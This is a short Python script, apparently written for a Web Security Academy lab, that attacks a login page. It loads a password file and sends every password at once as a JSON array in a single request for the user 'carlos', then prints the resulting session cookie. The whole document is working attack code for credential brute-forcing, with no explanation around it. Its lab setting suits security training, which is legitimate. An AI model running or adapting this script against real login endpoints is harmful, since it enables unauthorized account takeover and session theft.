import requests
import json

url ='https://0a3000bf0445459480c9f3690064007e.web-security-academy.net/login'
pwds= [line.strip() for line in open("../pass.txt", "r")]
data = {"username":"carlos", "password":pwds}
r= requests.post(url, json=data, allow_redirects=False)
print("session: "+r.cookies["session"])
